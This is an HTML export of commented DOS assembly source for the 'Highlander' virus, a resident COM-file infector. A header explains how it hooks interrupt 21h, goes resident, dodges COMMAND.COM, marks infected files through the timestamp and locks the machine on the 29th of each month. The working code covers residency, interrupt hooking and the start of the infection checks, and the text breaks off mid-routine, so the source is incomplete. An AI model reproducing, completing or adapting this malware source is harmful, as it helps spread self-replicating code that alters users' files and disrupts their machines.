<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;HIGHLAND.COM</span><span class="sc0">

</span><span class="sc1">;This is the HIGHLANDER Virus version 1.0.  </span><span class="sc0">

</span><span class="sc1">;This virus is a generic, parasitic, resident COM infector.  It will not</span><span class="sc0">
</span><span class="sc1">;infect command.com however.  It is not destructive but can be irritating.</span><span class="sc0">
</span><span class="sc1">;Interrupt 21 is hooked.</span><span class="sc0">

</span><span class="sc1">;This virus is to be assembled under TASM 2.0 with the /m2 switch.</span><span class="sc0">

</span><span class="sc1">;When an infected file is executed, the virus code is executed first.</span><span class="sc0">
</span><span class="sc1">;The virus first checks to see if the virus is already resident.  It does</span><span class="sc0">
</span><span class="sc1">;this by setting the AH register to 0DEh.  This subfunction is currently</span><span class="sc0">
</span><span class="sc1">;unsupported by DOS.  Interrupt 21 is then called.  If after the call, AH is </span><span class="sc0">
</span><span class="sc1">;unchanged, the virus is not resident.  If AH no longer contains 0DEh, the</span><span class="sc0">
</span><span class="sc1">;virus is assumed to be resident (If the virus is resident, AH will actually</span><span class="sc0">
</span><span class="sc1">;be changed to 0EDh.  This is never checked for, only a change from 0DEh</span><span class="sc0">
</span><span class="sc1">;is checked for).  If the virus is already resident, the executing viral</span><span class="sc0">
</span><span class="sc1">;code will restore the host in memory to original condition and allow it</span><span class="sc0">
</span><span class="sc1">;to execute normally.  If however, the virus is not resident, Interrupt 21</span><span class="sc0">
</span><span class="sc1">;will then be trapped by the virus.  Once this is accomplished, the virus</span><span class="sc0">
</span><span class="sc1">;will free all available memory that it does not need (COM programs are</span><span class="sc0">
</span><span class="sc1">;allocated all available memory when they are executed even though they can</span><span class="sc0">
</span><span class="sc1">;only occupy one segment).  The viral code will then copy the original </span><span class="sc0">
</span><span class="sc1">;environment and determine the path and filename of the host program in </span><span class="sc0">
</span><span class="sc1">;memory.  The viral code will then shell out and re-execute the host </span><span class="sc0">
</span><span class="sc1">;program.  The virus is nearly resident now.  When the virus shells out</span><span class="sc0">
</span><span class="sc1">;and re-executes the host, a non-supported value is passed in the AL</span><span class="sc0">
</span><span class="sc1">;register.  This is interpreted by the virus to mean that the infection</span><span class="sc0">
</span><span class="sc1">;is in transition and that when the host is re-executed, to assume that the</span><span class="sc0">
</span><span class="sc1">;virus is already resident.  This value is then changed to the proper value</span><span class="sc0">
</span><span class="sc1">;so that the shell process will execute normally (INT 21 is already trapped</span><span class="sc0">
</span><span class="sc1">;at this point).  This shell process is invisible, since the viral code</span><span class="sc0">
</span><span class="sc1">;so successfully copies the original environment.  Once the host has </span><span class="sc0">
</span><span class="sc1">;finished executing, control is then returned back to the original host</span><span class="sc0">
</span><span class="sc1">;(the viral code).  The virus then completes execution by going resident</span><span class="sc0">
</span><span class="sc1">;using interrupt 027h.  In all appearances, the host program has just </span><span class="sc0">
</span><span class="sc1">;completed normal execution and has terminated.  In actuality, the virus</span><span class="sc0">
</span><span class="sc1">;is now fully resident.</span><span class="sc0">

</span><span class="sc1">;When the virus is resident, interrupt 021h is trapped and monitored.</span><span class="sc0">
</span><span class="sc1">;When a program is executed, the resident virus gets control (DOS executes</span><span class="sc0">
</span><span class="sc1">;programs by shelling from DOS using interrupt 021h, subfunction 04bh).</span><span class="sc0">
</span><span class="sc1">;When the virus sees that a program is being executed, a series of checks</span><span class="sc0">
</span><span class="sc1">;are performed.  The first thing checked for is whether or not the program</span><span class="sc0">
</span><span class="sc1">;to be executed has 'D' as the seventh letter in the filename.  If it does</span><span class="sc0">
</span><span class="sc1">;the program is not infected and is allowed to execute normally (this is</span><span class="sc0">
</span><span class="sc1">;how the virus keeps from infecting COMMAND.COM.  No COM file with a 'D'</span><span class="sc0">
</span><span class="sc1">;as the seventh letter will be infected).  If there is no 'D' as the seventh</span><span class="sc0">
</span><span class="sc1">;letter, the virus then checks to see if the program to be executed is a</span><span class="sc0">
</span><span class="sc1">;COM file or not.  If it is not a COM file, it is not infected and allowed</span><span class="sc0">
</span><span class="sc1">;to execute normally.  If the COM file test is passed, the file size is then</span><span class="sc0">
</span><span class="sc1">;checked.  Files are only infected if they are larger than 1024 bytes and</span><span class="sc0">
</span><span class="sc1">;smaller than 62000 bytes.  If the file size is within bounds, the file</span><span class="sc0">
</span><span class="sc1">;is checked to see if it is already infected.  Files are only infected</span><span class="sc0">
</span><span class="sc1">;a single time.  The virus determines infection by checking the date/time</span><span class="sc0">
</span><span class="sc1">;stamp of the file.  If the seconds portion of the stamp is equal to 40,</span><span class="sc0">
</span><span class="sc1">;the file is assumed to be infected.  If the file is infected, the virus</span><span class="sc0">
</span><span class="sc1">;then checks the date.  If it is the 29th day of any month, the virus will</span><span class="sc0">
</span><span class="sc1">;then display its irritating qualities by displaying the message </span><span class="sc0">
</span><span class="sc1">;'Highlander 1 RULES!' 21 times and then locking the machine and forcing</span><span class="sc0">
</span><span class="sc1">;a reboot.  If the file is not infected, infection will proceed.  The </span><span class="sc0">
</span><span class="sc1">;virus stores the original attributes and then changes the attributes to</span><span class="sc0">
</span><span class="sc1">;normal, read/write.  The file length is also stored.  The file is then</span><span class="sc0">
</span><span class="sc1">;opened and the first part of the file is read and stored in memory (the</span><span class="sc0">
</span><span class="sc1">;exact number of bytes is the same length as the virus).  The virus then</span><span class="sc0">
</span><span class="sc1">;proceeds to overwrite the first part of the file with its own code.  The </span><span class="sc0">
</span><span class="sc1">;file pointer is then adjusted to the end of the file and a short </span><span class="sc0">
</span><span class="sc1">;restoration routine is copied.  The original first part of the file is </span><span class="sc0">
</span><span class="sc1">;then copied to the end of the file after the restore routine.  The files</span><span class="sc0">
</span><span class="sc1">;time/date stamp is then adjusted to show an infection (the seconds portion</span><span class="sc0">
</span><span class="sc1">;of the time is set to 40.  This will normally never be noticed since </span><span class="sc0">
</span><span class="sc1">;directory listings never show the seconds portion).  The file is then</span><span class="sc0">
</span><span class="sc1">;closed and the original attributes are restored.  Control is then passed</span><span class="sc0">
</span><span class="sc1">;to the original INT 021h routine and the now infected program is allowed</span><span class="sc0">
</span><span class="sc1">;to execute normally.</span><span class="sc0">

</span><span class="sc1">;This virus will infect read-only files.</span><span class="sc0">
</span><span class="sc1">;COMMAND.COM will not be infected.</span><span class="sc0">
</span><span class="sc1">;It is not destructive but can be highly irritating.</span><span class="sc0">



</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
     </span><span class="sc5">IDEAL</span><span class="sc0">


</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">checkinfect</span><span class="sc0">              </span><span class="sc1">;jump over data to virus code</span><span class="sc0">


</span><span class="sc5">data1</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcode</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">      </span><span class="sc1">;address of restore routine</span><span class="sc0">
</span><span class="sc5">typekill</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01ah</span><span class="sc0">                      </span><span class="sc1">;kills the DOS 'type' command</span><span class="sc0">
</span><span class="sc5">version</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'v05'</span><span class="sc0">                     </span><span class="sc1">;virus version number</span><span class="sc0">
</span><span class="sc5">data2</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">05ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;environment string for shell process</span><span class="sc0">
</span><span class="sc5">data3</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'COM'</span><span class="sc0">                     </span><span class="sc1">;COM file check</span><span class="sc0">
</span><span class="sc5">data4</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;data preceeding filename in environment</span><span class="sc0">
</span><span class="sc5">data5</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Highlander 1 RULES! $'</span><span class="sc0">   </span><span class="sc1">;irritating message </span><span class="sc0">


</span><span class="sc5">restcode</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;restoration routine to restore host </span><span class="sc0">
     </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">;move host code back to original loc</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;setup to transfer control to 0100h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero ax</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">;transfer control to 0100h and allow host</span><span class="sc0">
                                  </span><span class="sc1">;to execute normally </span><span class="sc0">


</span><span class="sc5">checkinfect</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;check to see if virus already resident</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0de00h</span><span class="sc0">                </span><span class="sc1">;unsupported subfunction</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc0">                  </span><span class="sc1">;is it unchanged?</span><span class="sc0">
     </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">continfect</span><span class="sc0">                </span><span class="sc1">;yes, continue going resident</span><span class="sc0">
                                  </span><span class="sc1">;no, already resident, restore host</span><span class="sc0">


</span><span class="sc5">restorehost</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;setup for restore routine</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                 </span><span class="sc1">;destination of bytes to be moved</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">data1</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of restore routine </span><span class="sc0">
                                  </span><span class="sc1">;(original host)</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;setup for xfer to restore routine</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">checkinfect</span><span class="sc4">-</span><span class="sc5">restcode</span><span class="sc0">  </span><span class="sc1">;source of bytes to be moved</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcode</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc0">         </span><span class="sc1">;number of bytes to move</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">;xfer to restore routine</span><span class="sc0">


</span><span class="sc5">continfect</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;continue infection</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                 </span><span class="sc1">;set ax to get INT 21 vector address</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;get INT 21 vector</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc5">int21trap</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                                  </span><span class="sc1">;store address in viral code</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc5">int21trap</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                                  </span><span class="sc1">;store segment in viral code </span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">;set dx to start of viral code</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                 </span><span class="sc1">;set ax to change INT 21 vector</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;change INT 21 to point to virus</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">data2</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">;copy current segment to env string</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">data2</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">;for shell process</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc5">data2</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;restore es to current segment</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcode</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">  </span><span class="sc1">;set bx to end of viral code</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                    </span><span class="sc1">;divide by 16 </span><span class="sc0">
     </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;INC by 1 just in case.  bx is number of</span><span class="sc0">
                                  </span><span class="sc1">;paragraphs of memory to reserve</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc0">                  </span><span class="sc1">;set ah to release memory</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;release all excess memory </span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get segment of environment copy</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">;zero si</span><span class="sc0">
     </span><span class="sc6">cld</span><span class="sc0">                          </span><span class="sc1">;clear direction flag</span><span class="sc0">


</span><span class="sc5">tryagain</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data4</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">;point to data preceeding filename</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;data is 4 bytes long</span><span class="sc0">
     </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">;check for match</span><span class="sc0">
     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tryagain</span><span class="sc0">                 </span><span class="sc1">;if no match, try again</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">;filename found.  set dx to point</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data2</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">;set bx to point to environment string</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04bffh</span><span class="sc0">                </span><span class="sc1">;set ax to shell and execute.  AL contains</span><span class="sc0">
                                  </span><span class="sc1">;an invalid value which will be interpreted</span><span class="sc0">
                                  </span><span class="sc1">;by the virus (int 21 is now trapped by it)</span><span class="sc0">
                                  </span><span class="sc1">;and changed to 00.</span><span class="sc0">
     </span><span class="sc6">cld</span><span class="sc0">                          </span><span class="sc1">;clear direction flag</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;shell and re-execute the host program</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">endcode</span><span class="sc4">-</span><span class="sc5">begin</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">0110h</span><span class="sc0">
                                  </span><span class="sc1">;set dx to end of virus *2 plus 10.  This</span><span class="sc0">
                                  </span><span class="sc1">;will point to the end of the resident</span><span class="sc0">
                                  </span><span class="sc1">;portion of the virus</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc0">                      </span><span class="sc1">;terminate and stay resident</span><span class="sc0">


</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;start of virus.  The trapped INT 21 points</span><span class="sc0">
                                  </span><span class="sc1">;to this location.</span><span class="sc0">
     </span><span class="sc6">pushf</span><span class="sc0">                        </span><span class="sc1">;store the flags</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc0">                  </span><span class="sc1">;is calling program checking for infection?</span><span class="sc0">
     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check4run</span><span class="sc0">                </span><span class="sc1">;no, continue on checking for execution</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc0">                  </span><span class="sc1">;yes, change ah to 0edh</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">                     </span><span class="sc1">;jump over rest of viral code</span><span class="sc0">


</span><span class="sc5">check4run</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0">                  </span><span class="sc1">;check for program attempting to execute</span><span class="sc0">
     </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nextcheck</span><span class="sc0">                 </span><span class="sc1">;yes, continue checks</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">                     </span><span class="sc1">;no, jump over rest of virus</span><span class="sc0">


</span><span class="sc5">nextcheck</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                  </span><span class="sc1">;check if virus is shelling.  0ffh will</span><span class="sc0">
                                  </span><span class="sc1">;normally never be used and is used by</span><span class="sc0">
                                  </span><span class="sc1">;the virus to shell the host before it is</span><span class="sc0">
                                  </span><span class="sc1">;fully resident.  This prevents the virus</span><span class="sc0">
                                  </span><span class="sc1">;from shelling twice, which will work but</span><span class="sc0">
                                  </span><span class="sc1">;lose the environment and cause problems.</span><span class="sc0">
     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">workvirus</span><span class="sc0">                </span><span class="sc1">;normal DOS shell. Jump to virus meat.</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                    </span><span class="sc1">;virus is shelling.  zero al.</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">                     </span><span class="sc1">;jump over rest of virus</span><span class="sc0">


</span><span class="sc5">workvirus</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;store all registers subject to change</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;store the code segment so it can be used</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;to set the ds and es registers</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;set ds to same as cs</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">;set es to same as cs</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">                  </span><span class="sc1">;set dx to offset 080h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">                  </span><span class="sc1">;set ah to create DTA</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;create DTA at 080h (normal DTA area)</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;set ds to original ds</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;set dx to original dx (ds:dx is used to </span><span class="sc0">
                                  </span><span class="sc1">;point to the path and filename of the</span><span class="sc0">
                                  </span><span class="sc1">;program to be executed)</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;store these values back</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;zero cx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">                  </span><span class="sc1">;set ah to search for filename match</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;search for filename (this is primarily</span><span class="sc0">
                                  </span><span class="sc1">;done to setup data in the DTA so that it</span><span class="sc0">
                                  </span><span class="sc1">;can be checked easier than making a</span><span class="sc0">
                                  </span><span class="sc1">;number of individual calls)</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;store es (same as cs)</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;set ds to same as es and cs</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">087h</span><span class="sc4">],</span><span class="sc12">'D'</span><span class="sc0">          </span><span class="sc1">;check for 'D' as seventh letter in file</span><span class="sc0">
     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">j5</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0">                 </span><span class="sc1">;if 'D' is 7th letter, dont infect</span><span class="sc0">
</span><span class="sc5">j5</span><span class="sc4">:</span><span class="sc0"> 
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data3</span><span class="sc4">+</span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">;set source of bytes to compare</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">                  </span><span class="sc1">;set destination of bytes to compare</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">;number of bytes to compare</span><span class="sc0">
     </span><span class="sc6">cld</span><span class="sc0">                          </span><span class="sc1">;compare forward</span><span class="sc0">
     </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">;compare bytes (check to see if file's</span><span class="sc0">
                                  </span><span class="sc1">;extension is COM)</span><span class="sc0">
     </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j1</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc0">                 </span><span class="sc1">;not a COM file.  Dont infect</span><span class="sc0">
</span><span class="sc5">j1</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc2">009ah</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;set bx to length of file</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">                  </span><span class="sc1">;is length &gt; 1024?</span><span class="sc0">
